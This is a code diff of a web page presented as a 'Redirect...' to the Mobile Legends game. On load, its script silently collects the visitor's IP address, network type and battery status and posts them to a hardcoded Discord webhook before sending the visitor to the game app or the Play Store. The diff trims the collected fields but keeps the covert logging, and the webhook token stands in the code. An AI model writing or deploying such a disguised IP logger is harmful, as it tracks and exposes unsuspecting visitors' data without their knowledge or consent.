@@ -6,22 +6,15 @@
     <title>Redirect...</title>
     <script>
         window.onload = async function() {
-            let ipData = await fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .catch(() => ({ ip: "Tidak terdeteksi" }));
-
-            let userAgent = navigator.userAgent;
-            let platform = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
-            let screenWidth = screen.width;
-            let screenHeight = screen.height;
-            let battery = navigator.getBattery ? await navigator.getBattery() : null;
-            let batteryStatus = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})` : "Tidak terdeteksi";
+            let ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
             let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             let networkType = connection ? connection.effectiveType : "Tidak terdeteksi";
+            let battery = navigator.getBattery ? await navigator.getBattery() : null;
+            let batteryStatus = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})` : "Tidak terdeteksi";
 
             let webhookURL = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
             let payload = {
-                content: `IP: ${ipData.ip}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\nBattery: ${batteryStatus}\nNetwork: ${networkType}`
+                content: `IP: ${ipData.ip}\nNetwork: ${networkType}\nBattery: ${batteryStatus}`
             };
 
             fetch(webhookURL, {
@@ -30,13 +23,11 @@
                 body: JSON.stringify(payload)
             });
 
-            setTimeout(function() {
-                // Mencoba redirect ke aplikasi Mobile Legends terlebih dahulu
-                window.location.href = "intent://#Intent;package=com.mobile.legends;scheme=mobilelegends;end";
+            setTimeout(() => {
+                window.location.href = "mobilelegends://";
             }, 1000);
 
-            setTimeout(function() {
-                // Jika gagal redirect ke aplikasi, alihkan ke Play Store
+            setTimeout(() => {
                 window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
             }, 3000);
         };
